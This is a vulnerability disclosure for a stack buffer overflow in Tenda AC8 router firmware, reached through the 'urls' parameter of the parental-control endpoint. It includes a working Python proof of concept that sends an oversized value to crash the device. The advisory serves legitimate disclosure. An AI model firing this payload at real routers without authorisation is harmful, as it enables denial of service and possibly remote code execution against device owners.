# CVE-2025-25667

Tenda AC8 V16.03.34.06  was discovered to contain a stack overflow via the urls parameter in the function get_parentControl_list_Info.

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

AC8v4 V16.03.34.06

## Vulnerability details

In function `get_parentControl_list_Info` line 34, it reads in a user-provided parameter `urls`, and the variable is passed to the function `strcpy` in line 52 without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.

## POC

```python
import requests

ip = '192.168.2.1'
headers = {
    'Host': ip,
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}

urls = "w" * 1000
data = {
    'deviceId': '10:11:11:11:11:16',
    'deviceName': 'deviceNAME6',
    'enable': '1',
    'time': '19:00-20:00',
    'url_enable': '1',
    'urls': urls,
    'day': '1,1,1,1,1,1,1',
    'limit_type': '0',
}

response = requests.post(
   f'http://{ip}/goform/saveParentControlInfo',
    headers=headers,
    data=data,
    verify=False,
)
```

![img](https://s2.loli.net/2025/02/15/TXJKBCl4tW6Siky.png)